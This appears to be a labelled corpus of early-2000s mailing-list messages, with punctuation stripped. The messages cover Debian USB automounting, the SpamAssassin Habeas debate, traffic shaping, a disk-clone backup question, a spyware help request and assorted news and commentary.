Re  who initiates mounting in debian On Tue     May                      Jonas Stein wrote       it looks if some devices are mounted automatic  after plugging into USB    slot     and some wait until i click on the device name in dolphin thunar or    similar         I dont understand who mounts when       I suppose some of the  magic  is done by udev  automounter and KDE and    so on     Yes  in stable  it s a mix between hal udev and desktop environment mount   system         I am looking for a set of rules which software is allowed to do mounts    and in which hierachy     Is there a kind of debian policy about mounting     I suppose Debian follows FHS    media  for removable devices and   mnt  for   temporarily mount points            On a debian stable PC i users are not allowed to umount their usb stick     if its mounted in KDE  But it works on console     On GNOME yes  users can mount umount their own usb devices via Nautilus       On a debian testing PC i d like to have some automatic action after    inserting my GPS device in the USB slot  First it should be mounted    somewhere     It should be automatically mounted anywhere under   media  as AKAIK  that   is the default action for removable storage       and second the latest trackfiles should be moved to  foo    You will need a bit of scripting to achieve this        Is it a good way to use a udev rule for that      There must be some pre made applications to get that but you can also try   to get it done with udev rules  A quick example  courtesy of Google     http   www gradstein info hardware how to automatically run a script after inserting a usb device on ubuntu       Should i use  media to mount the USB device  or is  media reserved for     the system     You can use  media  and as Boyd already suggested  give the device a   label to get a static name so it always get mounted under the   same path  i e     media mygps      Greetings          Camale  n           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org pan                     csmining org      ,1

Re  [SAtalk] O T  Habeus    Why Dan Kohn  writes     Guys  the Habeas Infringers List  HIL  exists explicitly to deal with   spammers while we re getting judgments against them and especially in   other countries  where those judgments are harder to get   My concern doesn t stem from failing to understand how your business is intended to work   My concern is the lack of empirical evidence that it will reduce the amount of uncaught spam     Please note that nobody has ever had an incentive before to go after   regular spammers   Yes  some attorneys general have prosecuted blatant   pyramid schemes  and ISPs have won some theft of service suits  but   the vast majority of spammers go forward with out any legal hassles    So  I can t understand how Daniel can assert that you can t track   spammers down when it s never really been tried   Please don t misquote me   I did not assert that you  can t track spammers    Here is what I said     It will be difficult to find  prosecute  and win money from someone in   various non friendly countries where spam originates  China is a good   example  even if they do officially  respect  copyright law   I understand the incentive that you have to pursue spammers  but that does not directly translate to less spam being sent to my inbox   It is an indirect effect and the magnitude of the effect may not be sufficient to counteract the ease with which a     score on the mark allows spam to avoid being tagged as spam     Daniel  it s easy enough for you to change the Habeas scores yourself   on your installation   If Habeas fails to live up to its promise to   only license the warrant mark to non spammers and to place all   violators on the HIL  then I have no doubt that Justin and Craig will   quickly remove us from the next release   But  you re trying to kill   Habeas before it has a chance to show any promise   I think I ve worked on SA enough to understand that I can localize a score   I m just not comfortable with using SpamAssassin as a vehicle for drumming up your business at the expense of our user base   I think it would make more sense to start Habeas with a less aggressive score  one which will not give spammers a quick path into everyone s inbox  and after we ve seen evidence that the system works  then we can increase the magnitude of the score   Dan                                                           This sf net email is sponsored by ThinkGeek Welcome to geek heaven  http   thinkgeek com sf _______________________________________________ Spamassassin talk mailing list Spamassassin talk lists sourceforge net https   lists sourceforge net lists listinfo spamassassin talk  ,1

Re  Forged whitelist spamGary Lawrence Murphy   This is for the whitelist fans  Can someone please tell us why the   following extremely frequent spam header pattern would _not_ pass a   whitelist test  The letter itself is most certainly spam viral and  was most certainly not sent by me  but I see no way you might tell that it   was not  nor can I see how I might charge the sender with fraud for having    impersonated  my account     My uneducated guess  is that all they need to   jump expensive whitelist  walls would be buckshot a spam laden Klez     There are several issues here       For reasons that have nothing to do with commercial advertising  we need email software that prevents virus attacks a la Melissa and Klez  We simply can t continue down the path where every script kiddie with a grudge or political agenda can cause millions or billions of dollars worth of damage       Very likely  email practices will evolve to the point that digital signatures are the standard way to recognize the sender of a message  Sabotaging your machine or otherwise compromising your private key will be the only way that someone can forge a message from you  I don t see any reason that email software that automatically uses digital signatures for contact management and whitelisting would be any more expensive than existing email clients  Unless Microsoft manages to get a defacto monopoly on it       I think identity theft should be made a felony  with very stiff penalties  for reasons that have nothing to do with spam  No  obviously  simply parading around with a sign that says  I m George Bush  is not identity theft  On the other hand  I think using a virus to compromise someone else s private key should should fall into that category    _________________________________________________________________ MSN Photos is the easiest way to share and print your photos   http   photos msn com support worldwide aspx  http   xent com mailman listinfo fork   ,1

firewalls Digest V     firewalls Digest Thu     Jul      Volume      Issue       In This Issue    Re  QOS   FW  disable some sites   DNAT with iptables question   RE  DNAT with iptables question                                                                          From   George J  Jahchan   Subject  Re  QOS Date  Thu     Jul                         So  I m forced to conclude that the PacketShaper either sucks in a major   way  or that your explanation the explanation that you have been given of   it is wrong   Sorry    You are wrong on both counts  Explanation is valid for symmetrical TCP  for others see explanations below     Yes  all packets in an established TCP connection have the ACK flag set    So all packets except SYNs are candidates for delay when traffic limits   are exceeded  Whoops   You should change that to      are always candidates for predictive or preventive delay   ACKs are delayed  per flow  in such a way that WAN bound traffic reaching the edge router s Ethernet interface does not exceed WAN link speed  NO ROUTER QUEUES    It does not wait for the link to be at or near saturation to act    that is why  unlike queueing  it is predictive and not reactive   It slows down the rate of transmission of sending hosts  on a per flow basis  to accommodate WAN link speed limit and current network utilization  rather than fill up queues at LAN speeds and empty them at WAN speeds  eventually dropping the excess once the queue s  fill up  informing hosts to slow down their rate of transmission once queues are beyond a fixed threshold          Rate control works equally well for outbound and inbound traffic  Ever heard of an effective queueing technology for inbound traffic  Queueing packets after they have crossed a congested link does not make much sense  does it   Re  IPsec GRE or other encapsulated traffic  It obviously cannot dissect IPsec GRE or other encapsulated traffic  it sees the tunnel as one connection if the tunneling device is before the PS on the LAN side  VPN gateway and router are two separate devices  PS between them   If the router does the tunneling  then the PS sees clear traffic  Typically  in an organization the first scenario would be the case at headquarters and the second at branch offices  The PS at the branch sees traffic inside the tunnel whereas the unit at HQ sees all traffic as one tunnel which allows full management of both tunneled and clear traffic at both ends   UDP and asymmetrical TCP  where the PS and router only see the outgoing packet  return traffic coming back through a satellite downlink to a station on the LAN  are handled differently   For asymmetrical TCP  it will time the release of packets to the receiving device  thereby indirectly timing the release of acknowledgements by the receiving host  This informs the sender s TCP IP stack that it should slow the release of packets because limited bandwidth is available   For UDP  it utilizes flow based derivative random drop  It selectively drops only one packet at a time from flows that are predicted to cause congestion  which prevents heavy retransmissions and application timeouts   ICMP packets exceeding policy limits are dropped    _Maybe_ you can do a special case for TCP and try to offload some of the queueing on   the endpoints  but I really don t see the real gain in that   The real gain is manageability and control  A LAN host only knows about the state of its own connections and is oblivious to WAN conditions until its TCP IP stack learns  when router queues are nearly full  that the WAN is congested  A PS will predict and inform the LAN hosts  TCP IP stacks of the  speed limit to obey  for every connection  based on policies and network conditions   avoiding congestion  Control for asymmetrical TCP and UDP may not be as  tight  as for symmetrical TCP  but it does work   Queueing is akin to deploying cops only when traffic jams occur  vs  rate control where cops are permanently deployed throughout town  communicating with each other and with a central control point  predicting upcoming congestion and regulating traffic  ensuring a smooth flow of traffic  If there is potential for congestion  it will take a driver a hell of lot longer to cross town with first approach than it will with the second  Do you agree         Original Message       From   Mikael Olsson   To   George J  Jahchan   Cc   Firewalls List   Sent  Wednesday  July               pm Subject  Re  QOS      George J  Jahchan  wrote      The whole purpose of the device is to pro actively prevent WAN congestion      it sits between client and server  client inside server outside or client   outside server inside    it does not make any difference  and pro actively   adjusts the TCP window size  by delaying the acknowledgement  to get the   sending host to honor the speed limit for that individual connection    calculated in real time based on user defined policies and current network   conditions    Umm  don t get me wrong here  but I think you ve been fed a less than  accurate sales pitch   Let s ponder this for a minute   The device works by delaying ACKs    that is  packets with the ACK flag set  right        [letting this sink in for a while]       Yes  all packets in an established TCP connection have the ACK flag set  So all packets except SYNs are candidates for delay when traffic limits are exceeded  Whoops    Okay  let s assume for a second that the packets aren t actually delayed  but that the ACK sequence numbers or TCP window size fields are re written  dicey   All you ve accomplished is move the queueing  delaying  from the traffic shaper to the endpoints  You still get L  to L  delays  Big deal if it happens on the wire or in the stack  Also  convincing endpoints to do delays probably results in less than perfect shaping since stack retransmit timings suddenly affect the actual bandwidth available rather than having the shaper itself do it  the shaper knows exactly when there is bandwidth available   But this doesn t even begin to touch on other protocols like UDP or ICMP  Or  for that matter  IPsec GRE whatever tunneled traffic  Neither of them have sequence numbers or window sizes that you can manipulate    So  I m forced to conclude that the PacketShaper either sucks in a major way  or that your explanation the explanation that you have been given of it is wrong   Sorry    What I think happens is that the delay is  Subject  FW  disable some sites Date  Thu     Jul                       The list addy changed ofcourse    o

Michael       If I was in your shoes I would first investigate if there   is a security policy in your organisation  If you dont know   what I mean by a security policy I would advice you to    start reading about it  A search on google would be of a   big help for you       If there is a security policy I would read it and investigate   what is tells about how employees are able to use their   workstations for performing their function  In a security    policy there should be things what employees are allowed   to do on the network   internet and what not       If there isnt a security policy I would advice you to implement   one in your company  Because without one you cant punish   employees by violating the policy and if there is a court case   you dont have any rock solid thing to smack around with       Without a policy you are just implementing solutions to prevent   employees in doing things that  im my opinion  they arent allowed   to do on their workstations anyway  I dont like the idea that    employees play games  use kazaa  ICQ  MSN  etc etc in stead   of working what we pay them to do  This is why a security policy   is important because then you can say to employees that they   violated it and that there are consequences for that  deny internet   access  etc etc        Owkee       now that this is out of the way time to proceed about   the proxy thingie       A proxy dont have to be the default gateway of your network to   use it  It is a function in Internet Explorer or whatever browser you   use in your network       If you ask me Checkpoint Firewalls are just good in using for what   their real purpose is and that is firewalling a network  I dont like the   idea that my firewall is also CVS http thingie because I dont think   a firewall is its purpose to do that  Proxies are a much better solutions   for that and they are also developed for that purpose       Depending on your network setup and the OS and Proxy brand of your   current proxy you have several solutions which was already provided    by people on this list  My favorite proxy is Squid and there are probably   a lot of http blacklist programs that work with Squid to block websites   and stuff       I still think you should first deny direct internet traffic from   workstations    and only allow traffic to the internet from servers that are allowed to do   so  You should think about proxies  email servers  etc etc  This should   also prevent people from playing games  especially those Quake kinda   games because those use ports that arent necessary for normal    webbrowsing  Games running over port    and not http related are blocked   by the proxy if that proxy is a true Layer   application layer proxy    These   kinda proxies can view in the TCP IP packet and see if this is legitimate    http traffic or that someone tries to tunnel something over port          Anyway       again food for some thoughts       Regards             Brenno

to change the topology   many thing need to be changed       Did you have another idea to help me  Someone suggest me to buy the    websence   but I dont have the budget right now       Thanks a lot      Michael      Hiemstra  Brenno wrote        Michael         The first thing is to build a security policy that    states what people are allowed to do and what    not  Everyone needs to accept this policy and     if they violate it you can apply rules that you state    in your security policy         If I had the option for your network setup I would    install a proxy server and demand every client    to connect to the proxy if they want to use the     internet         The proxy will only allow http  ftp  and other  approved     services to connect to the internet  And you can let    them check to some database which websites are    allowed and deny access to sites that aren t allowed        Your company firewall will only allow the proxy to connect    to the internet  Clients are denied         This way the clients cant connect directly to the internet    game servers and on the proxy you can deny clients    to connect to the game servers         I hope this is an option for

Kill Your GodsHindus mourn  monkey god    By Omer Farooq BBC reporter in Hyderabad  Hundreds of people have attended the funeral of a monkey which became revered as a divine incarnation of a Hindu god in the southern Indian state of Andhra Pradesh    The monkey was quite old and both its hind legs were paralysed  Animal rights campaigners say the monkey died of starvation and exhaustion after being trapped in a temple for a month by over zealous worshippers   The animal was cremated in Anantapur district      kilometres      miles  south of the state capital  Hyderabad  on Sunday   It had not eaten for three weeks   Last rites were performed by priests in the village of Timmiganipally in the presence of hundreds of devotees who had come to believe that the monkey was a reincarnation of the Hindu monkey god  Hanuman   Garlanded  One animal rights activist said his group s efforts to save the monkey had failed because of the blind faith of the people    The monkey s death came a day after he and others tried to move the animal out of the temple  but were prevented by villagers   The monkey  which was found perched on top of an idol of Hanuman a month ago  attracted hundreds of devotees every day from surrounding villages  as well as from the neighbouring state of Karnataka   Devotees showered the monkey with fruit and flowers and worshipped it around the clock    Exploited   Locals said they believed that Lord Hanuman was visiting the village  as the temple had stopped daily rituals after a dispute between two groups of residents   But animal rights campaigners complained that the animal was being mistreated   They filed a petition in the state s High Court saying the monkey had been forcibly confined in the temple   The group also alleged that people s religious feelings were being exploited to make money   The court then ordered the local administration to rescue the monkey   but villagers prevented officials from taking him for treatment in time      ,1

[Spambayes] test sets [Guido]   Perhaps more useful would be if Tim could check in the pickle s     generated by one of his training runs  so that others can see how   Tim s training data performs against their own corpora   I did that yesterday  but seems like nobody bit   Just in case   I uploaded a new version just now   Since MINCOUNT went away  UNKNOWN_SPAMPROB is much less likely  and there s almost nothing that can be pruned away  so the file is about  x larger now        http   sf net project showfiles php group_id           This could also be the starting point for a self contained distribution    you ve got to start with  something   and training with python list data   seems just as good as anything else    The only way to know anything here is for someone to try it   ,1
OT   Backup of HA server on external driveFrom nobody Wed Mar                  Content Type  text plain  charset ISO         Hi all     I have to make a backup plan for a server that is physically very far away  from me right now  If for some reason this server goes south  I have to have  a plan and it has to be done quickly  The problem is that the personnel that  is on site doesn t know squat about Linux  or computers  for that matter    so it must be something dead simple  I was thinking of getting a spare hard  drive  connect it to the working server  do a dd of the entire disk to the  new disk  and disconnect the disk  the people there can swap hard disks    Something like    dd if  dev sda of  dev sdb bs         assuming that sda is the working disk and sdb is the new  unformatted and  unpartitioned disk  So if hte machine breaks  I can get the new disk and put  in a new machine and everything should work  This server is doing firewall  and openvpn  etc  no X  no fancy stuff  Is this going to work  What do you  guys think     Cheers     Ivan  ,1

apt conf suggestionHi   how about applying this to the default apt conf shipped with the freshrpms net apt package   I found it a bit weird when the behaviour changed between the old     x and the new     x versions so that when doing a  apt get upgrade   it wouldn t tell me  which  packages were to be upgraded  just that it was about to upgrade something         apt conf                                         apt conf                                                        Get             Download Only  false         Show Upgraded  true                      \ ille Skytt  ville skytta at iki fi   _______________________________________________ RPM List mailing list  http   lists freshrpms net mailman listinfo rpm list   ,1

Re  [SAtalk] O T  Habeus    Why On    Aug       Daniel Quinlan wrote     Dan Kohn  writes         Daniel  it s easy enough for you to change the Habeas scores yourself     on your installation   If Habeas fails to live up to its promise to     only license the warrant mark to non spammers and to place all     violators on the HIL  then I have no doubt that Justin and Craig will     quickly remove us from the next release   But  you re trying to kill     Habeas before it has a chance to show any promise       I think I ve worked on SA enough to understand that I can localize a   score   I m just not comfortable with using SpamAssassin as a vehicle   for drumming up your business at the expense of our user base   I have to agree here   If Habeas is going to die just because SA does not support it  that s a serious problem with the business model  but that is nobody s problem but Habeas s   A possible solution is for Habeas s business model to include some kind of incentive for users of SA to give it the benefit of the doubt   I have yet to think of an incentive that fits the bill      On Thu     Aug       Justin Mason wrote     I don t see a problem supporting it in SpamAssassin    but I see Dan s   points           high score  as far as I can see  that s because SpamAssassin is       assigning such high scores to legit newsletters these days  and the       Habeas mark has to bring it down below that       IMO we have to fix       the high scorers anyway    no spam ever  needs  to score over   in our       scoring system       tagged anyway   This is off the topic of the rest of this discussion  but amavisd  in all its incarnations  and MIMEDefang and several other MTA plugins all reject at SMTP time messages that scores higher than some threshold  often        If some new release were to start scoring all spam no higher than      there d better be _zero_ FPs  because all those filters would drop their thresholds to     On Thu     Aug       Michael Moncur wrote     But I agree that there needs to be more focus on eliminating rules that   frequently hit on newsletters  If any newsletters actually use the Habeas   mark  that will be one way to help   Newsletters won t use the mark   Habeas is priced way too high    a factor of at least    over what the market will bear  IMO    on a per message basis for most typical mailing lists  Lockergnome  say  to afford it   On Thu     Aug       Harold Hallikainen wrote     Habeus has come up with a very clever way to use existing law to battle   spam  It seems that at some point they could drop the licensing fee to      or less and make all their income off suing the spammers for   copyright infringement   Sorry  that just can t work   If the Habeas mark actually becomes both widespread enough in non spam  and effectively enforced enough to be absent from spam  such that  e g   SA could assign a positive score to messages that do NOT have it  then spammers are out of business and Habeas has no one to sue   There s nobody left to charge except the people who want  or are forced against their will because their mail won t get through otherwise  to use the mark   Conversely  if there are enough spammers forging the mark for Habeas to make all its income suing them  then the mark is useless for the purpose for which it was designed   Either way it seems to me that  after maybe a couple of lawsuits against real spammers and a lot of cease and desist letters to clueless Mom Pops  then either  a  they re out of business   b  they have to sell the rights to use the mark to increasingly questionable senders  or  c  they ve both created and monopolized a market for  internet postage stamps  that everybody has to pay them for   The latter would be quite a coup if they [ ] could pull it off    they do absolutely nothing useful  unless you consider threatening people with lawsuits useful  yet still collect a fee either directly or indirectly from everyone on the internet    effectively we ll be paying them for the privilege of policing their trademark for them   I don t believe they ll ever get that far  but I don t particularly want to help them make it   [ ] And I use the term  they  loosely  because the whole company could  consist of one lawyer if it really got to that point                                                             This sf net email is sponsored by ThinkGeek Welcome to geek heaven  http   thinkgeek com sf _______________________________________________ Spamassassin talk mailing list Spamassassin talk lists sourceforge net https   lists sourceforge net lists listinfo spamassassin talk  ,1

Re  [ILUG] slashdot EW Dijkstra humorGary Coady wrote    Oops  I tend to feel like that most times  I tend to feel that if we   have extremely good compilation tools  then those tools should be able   to do the inlining and optimisation far better than I could  That s the   theory anyway    And there s always a tradeoff with inlining between   speed and memory bloat  which may sometimes be no tradeoff if swap   starts getting involved       This is something that often annoys me  Programmers can spend hours inlining code and relying on optimisation tools to improve performance  The best performance improvement can be obtained by fixing the algorithm   Most function calls get made very rarely  Optimising them often makes no sense  produces illegable code and nonsense algorithms   Inlining will help in functions that get called frequently and are small   such as string manipulation routines  But these are a small part of most applications   One example I frequently see is people optimising a database function call  Most database accesses involve many abstraction layers and millions of instruction cycles  Trying to save a few instruction cycles would be a cost saving of  say    seconds in    hours   But a simple hashmap cache of common data without any compiler or inline optimisations can turn that same    hours into    minutes       Matthew  who really should be writing code    __________________________________________________ Do You Yahoo   Everything you ll ever need on one web page from News and Sport to Email and Music Charts http   uk my yahoo com       Irish Linux Users  Group  ilug linux ie http   www linux ie mailman listinfo ilug for  un subscription information  List maintainer  listmaster linux ie   ,1

Re  MotherboardsOn                  PM  Jean Fran ois wrote     Hello        I might be wrong  but I guess the exact name for your motherboard is     DFI Lanparty DK p   t rs PLUS  as opposed to the Elite or Turbo     models   which has   SATAII ports  and I also guess you have used the     two yellow ports  If so  plug your drives in the orange ports to use     the Sata controller from the ICH  R and not the JMicron JMB     given     the vast amount of options traditionnally present in a DFI LanParty     BIOS  you can probably disable the JMicron controller if you want to     do so         The ICH  R only provides   SATAII ports  and the JMicron controller is     there to provide   additionnal ports        Yes  the PLUS is the correct model  I will have to look into it again    but I have   drives so they could not all be in the two yellow ports    This may also explain why fdisk lists my drives in the order  sdc  sdb    sda  Running lspci  k  I don t recall seeing ata_piix at all     Thanks for the input  I will have another look tonight            To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org  BFC  C          csmining org      ,1
Microsoft buys XDegress   more of a p p distributed data thing   I like this part   sounds like httpd on the client     http   www openp p com pub a p p            xdegrees html   Once the Client Component is installed  a server can order a program to run on the client  Any CGI script  Java servlet  ASP component  etc  could be run on the client  This is like breaking the Web server into two parts  Originally  Web servers just understood HTTP and sent pages  Then the field started demanding more from the Web and the servers got loaded down with CGI and mod_perl and active pages and stuff  So now the Web server can choose to go back to simple serving and  where the application is appropriate  let the client do the other razzamatazz  This is superior to JavaScript in one important detail  the program doesn t have to reload when a new page is loaded  as JavaScript functions do   And because XDegrees uses Web compatible technology  users can access XDegrees resources without installing any software  simply by using their browser         Scaling is the main question that comes to mind when somebody describes a new naming and searching system  CEO Michael Tanne claims to have figured out mathematically that the system can scale up to millions of users and billions of resources  Scaling is facilitated by the careful location of servers  XDegrees will colocate servers at key routing points  as Akamai does   and by directing clients to the nearest server as their default  home  server  Enterprise customers can use own servers to manage in house applications     Files can be cached on multiple systems randomly scattered around the Internet  as with Napster or Freenet  In fact  the caching in XDegrees is more sophisticated than it is on those systems  users with high bandwidth connections can download portions  or  stripes   of a file from several cached locations simultaneously  The XDegrees software then reassembles these stripes into the whole file and uses digital signatures to verify that the downloaded file is the same as the original  A key component of this digital signature is a digest of the file  which is stored as an HTTP header for the file     ,1

funny thing to me   I hear about so many  people being super scared to give out their SS    Well folks   I can get your SS  for    cents   Give me a name and address  and about     of the time I can get the number     We are so worried about putting our credit card number on the net  but we will give the card to a waiter or waitress and  they take it out of our sight for    minutes   They could do  who knows what with the CC number   I once had a person  tell me that her lawyer said that she should never fax a copy  of her check to anyone  checks by fax  because then that  person  me  would have her account info and could write  a check out for thousands of dollars   I told her to just send  it to me then and she said that was OK   Then I asked her  to tell me what the difference was between the original check  and a fax copy   I told her to ask her lawyer that too   Never  heard back from her     The bottom line is that if a crook wants to get your info  it is  available in many places   Have a good day      Terry    http   mysiteinc com tfn lfi html            Yes  I believe that the risk is out there but minimal  However   we can cut those risks by a few simple precautions  Most  importantly  never give any personal information at a site  that is not secure  always look for the lock in thetask bar  or a Veri secure sign or others    Also  never leave your information stored at a site  I put  in my credit information in each time instead of having  an account in standing  a little more time but less risks  involved  Of course  I mostly shop at my own Internet  mall and I know how safe it is there  credit card info is  deleted in a matter of seconds  Overall  I believe the web  to be a safe and very fruitful new frontier      Catherine F       http   www catco nexgenmall com             Yes  I had phenomena for   weeks and did not realize that  my ISP was shut down at the same time because the owner  was in a bad car accident   I had a full service account    My Internic fees were not paid so my WEB Address  went unprotected   A Russian stepped in  paid the fees   and  promptly assigned my www SchoolOfGeomatics com  address to a porn shop   Thus  I lost   years of building  up  st place rankings on    Search Engines and  nd place  on   more   This set me back about    months  I believe I  lost a minimum of              I have also been hit with viruses about    times   The first  time I lost almost   months of work   Now  I back up often  enough to not to lose so much time   This is also Internet  theft   These people are nothing but out and out criminals  and should spend years behind bars    Customers are well protected from credit card theft   however  merchants can lose a lot of money   I sell only by  purchase order and certified or registered company checks      Peter S     http   www GSSGeomatics com                                             JULY WINNER ANNOUNCED  And the July  One Question Survey  WINNER is

identity theft online      yes       no        Comments            No  This is a funny thing to me   I hear about so many people being super scared to give out their SS    Well folks  I can get your SS  for    cents   Give me a name and address and about     of the time I can get the number  We are so worried about putting our credit card number on the net  but we will give the card to a waiter or waitress and they take it out of our sight for    minutes   They could do who knows what with the CC number   I once had a person tell me that her lawyer said that she should never fax a copy of her check to anyone  checks by fax  because then that person  me  would have her account info and could write a check out for thousands of dollars   I told her to just send it to me then and she said that was OK   Then I asked her to tell me what the difference was between the original check and a fax copy   I told her to ask her lawyer that too   Never heard back from her  The bottom line is that if a crook wants to get your info  it is available in many places   Have a good day      Terry    http   mysiteinc com tfn lfi html           Yes  I believe that the risk is out there but minimal  However  we can cut those risks by a few simple precautions  Most importantly  never give any personal information at a site that is not secure  always look for the lock in thetask bar or a Veri secure sign or others  Also  never leave your information stored at a site  I put in my credit information in each time instead of having an account in standing  a little more time but less risks involved  Of course  I mostly shop at my own Internet mall and I know how safe it is there  credit card info is deleted in a matter of seconds  Overall  I believe the web to be a safe and very fruitful new frontier      Catherine F       http   www catco nexgenmall com           Yes  I had phenomena for   weeks and did not realize that my ISP was shut down at the same time because the owner was in a bad car accident   I had a full service account  My Internic fees were not paid so my WEB Address went unprotected   A Russian stepped in  paid the fees  and  promptly assigned my www SchoolOfGeomatics com address to a porn shop   Thus  I lost   years of building up  st place rankings on    Search Engines and  nd place on   more   This set me back about    months  I believe I lost a minimum of            I have also been hit with viruses about    times   The first time I lost almost   months of work   Now  I back up often enough to not to lose so much time   This is also Internet theft   These people are nothing but out and out criminals and should spend years behind bars    Customers are well protected from credit card theft  however  merchants can lose a lot of money   I sell only by purchase order and certified or registered company checks      Peter S     http   www GSSGeomatics com                                            JULY WINNER ANNOUNCED  And the

Rebuild at Ground Zerohttp   online wsj com article_print    SB                     html   The Wall Street Journal  September          COMMENTARY  Rebuild at Ground Zero  By LARRY SILVERSTEIN  Earlier this month  we New Yorkers observed the solemn anniversary of the horrific events that befell our city on Sept            All of those who perished must never be forgotten  The footprints of the fallen Twin Towers and a portion of the    acre site must be dedicated to a memorial and civic amenities that recall the sacrifices that were made there and the anguish that those senseless acts of terror created for the victims  families and  indeed  for all of us   But for the good of the city and the region  the    million plus square feet of commercial and retail space that was destroyed with the Twin Towers must be replaced on the site   About        people worked in the World Trade Center  Those jobs are lost  along with those of another        people who worked in the vicinity  Together  those jobs in lower Manhattan  for which the Trade Center was the economic stimulus  produced annual gross wages of about     billion  or     of the annual gross wages earned in the entire state  Some of the firms have relocated elsewhere in the city and region  but many have not  New York City is facing a budget deficit  Without additional jobs  the deficit may become permanent  This is one reason for the importance of rebuilding   If we do not replace the lost space  lower Manhattan never will regain the vibrancy it had as the world s financial center  Love them or hate them  and there were lots of New Yorkers on both sides of the issue  the Towers made a powerful statement to the world that said   This is New York  a symbol of our free economy and of our way of life   That is why they were destroyed  This is a second reason why the towers must be replaced  and with buildings that make a potent architectural statement   In recent weeks  redevelopment proposals have been circulated from many sources  Most of these focus not on the Trade Center site  however  but on all of lower Manhattan  Further  many believe that the    million square feet either could be located elsewhere  scattered in several sites  or simply never rebuilt   These proposals miss the point  What was destroyed  and what must be recovered  was the Trade Center  not all of lower Manhattan  Except over the towers  footprints  where there must be no commercial development  the office and retail space lost has to be rebuilt on or close to where it was   Access to mass transit makes the site ideal for office space of this size  That was a major reason why the Twin Towers were leased to     occupancy before       None of the other sites proposed for office development has remotely equal transportation access  With the reconstruction of the subway and PATH stations  plus an additional      billion in transit improvements planned  such as the new Fulton Transit Center and the direct  Train to the Plane  Long Island Rail Road connection  the site becomes even more the logical locus of office development   And New York will need the space  Before       the Group of     a task force of civic leaders led by Sen  Charles Schumer and former Treasury Secretary Robert Rubin  concluded that the city would need an additional    million square feet of new office space by      to accommodate the anticipated addition of         new jobs  The loss of the Twin Towers only heightens the need   As for those who say that    million square feet of office space downtown cannot be absorbed by the real estate market  I would simply point out that history shows them wrong  New York now has about     million square feet of office space  All new construction underway already is substantially leased up  New York had    million square feet of vacant office space at the beginning of the recession in       By       this space had been absorbed  at an annual rate of about   million square feet   We are seeking to rebuild    million square feet on the Trade Center site over a period of about    years  with the first buildings not coming on line until      and the project reaching completion in       This is an annual absorption rate of about a million feet  much lower than the     s  rate   Those who argue that New York cannot reabsorb office space that it previously had are saying that the city has had its day and is entering an extended period of stagnation and decline  I will not accept this view  nor will most New Yorkers   Mayor Michael Bloomberg said in a recent interview with the New York Times that the city  has to do two things  memorialize  but also build for the future   I believe that the Twin Towers site can gracefully accommodate    and that downtown requires    office and retail space of architectural significance  a dignified memorial that both witnesses and recalls what happened  and cultural amenities that would benefit workers as well as residents of the area   The challenge to accomplish this is enormous  But our city is up to the task   Mr  Silverstein is president of Silverstein Properties  a real estate firm whose affiliates hold    year leases on the World Trade Center site                         R  A  Hettinga  The Internet Bearer Underwriting Corporation     Farquhar Street  Boston  MA       USA

Re  Snow Leopard  Java   and NetbeansHas anyone tried it with the   M     or  M     developer preview  I m    somewhat concerned that this is a demonstrable regression between Java      and Java     however there are several other factors that can impact    memory use          vs     bit  biggest culprit         client    bit tuned garbage collection options running on        server    bit    client vs  server HotSpot itself  more aggressive compilation and    storage of compiled code     Anecdotally  I ve talked to several people who have large long running       bit processes on Snow Leopard with  GB of RAM machines who were    having a miserable time  While reverting to    bit may be a quick fix    for some  others who tuned the GC parameters or turned on     XX  UseCompressedOops  which compresses Java references to    bit    values in the heap  found that they could reclaim or even exceed their    original    bit performance  since they were still using the server    JVM      Since someone mentioned that NetBeans     Beta was working well  I d    suggest taking a look at it s JVM options and see if there wasn t some    tweaking done to optimize it for a    bit by default world     Best of luck   Mike Swingler  Java Runtime Engineer  Apple Inc     On Apr           at      AM  Dave Minnigerode wrote       I too have been using netbeans     on      and

had no change until I loaded in Java   and saw a    significant difference  I ll be trying out the suggestions people made    about using a different target platform than the one Netbeans is running

  able to find it in the archives     rom what I understand  there s some    issue with Snow Leopard and Java   that makes Netbeans     near    unusable   I ve had to do my development on a lesser powered PC because    there  things will actually open without pegging the CPU at      and    becoming unresponsive   Following a tip  I used Pacifist to reinstall    Leopard s Java   back onto the system  set it as the default  and tried    to launch Netbeans  Lo and behold  it was fast  responsive and showed    none of the problems I d been used to  Unfortunately  it made it so that    I couldn t work on my Java   based app                                 So  what is the actual situation here  Is this a known issue with    the Apple JVM that s  hopefully  going to get fixed  Is this a bug in    Netbeans  Am I the only one seeing issues this bad  and so it could be a    problem with my setup  Is there a workaround  Any help would be vastly    appreciated    the Windows box is having disk issues  and I d love to    move my primary development to the Macbook Pro as soon as possible  And    if push comes to shove  I may have to just rearchitect the project into    Java    which would not be a simple task                 _______________________________________________               Do not post admin requests to the list  They will be ignored                Java dev mailing

[IIU] spyware calling home Hello all I m looking for advice  My pc has developed a disturbing tendency of trying to access IP               without my consent  It has got to the stage where normal web browsing is almost impossible  I have checked IP address on RIPE database and I know precisely who is being called  I contacted that company on    July  when the problem first arose and asked for a remedy but  surprise  got no reply  A helpful person on the ie comp list suggested Adaware spyware removal  I ran this and haven t had a problem again until today  The offending program is obviously not in Adaware db   I run adaware with current ref files every day now   Any suggestions  please   for removing whatever the f    is causing this from my pc  Brian   _______________________________________________ IIU mailing list IIU iiu taint org http   iiu taint org mailman listinfo iiu   ,1

Native American economics  was Re  sed  s United States Roman     Empire g  I wanted to get back to this but didn t have the time   I actually lived on a couple different Indian reservations growing up in the Pacific Northwest and also spent a fair amount time in Lakota Sioux country as well   And my parents have lived on an even more diverse range of Indian reservations than I have  my experience being a direct result of living with my parents    I do get a lot of my information first hand  or in some cases  second hand from my father   The income figures for the Indians are somewhat misleading  mostly because it is really hard to do proper accounting of the effective income   While it is true that some Indians live in genuine poverty  it is typically as a consequence of previous poor decisions that were made by the tribe  not something that was impressed upon them   The primary problem with the accounting is that there is a tribal entity that exists separately from the individuals  typically an  Indian Corporation  of one type or another where each member of the tribe owns a single share  the details of when and how a share becomes active varies from tribe to tribe    In most tribes  a dividend is paid out to each of the tribal members from the corporation  usually to the tune of       k per person  depending on the tribe   The dividend money comes from a number of places  with the primary sources being the Federal Gov t and various businesses assets owned by the Indian corporation   You have to understand a couple things   First  a great many Indian tribes are run as purely communist enterprises   Everyone gets a check for their share no matter what   One of the biggest problems this has caused is very high unemployment  often         for 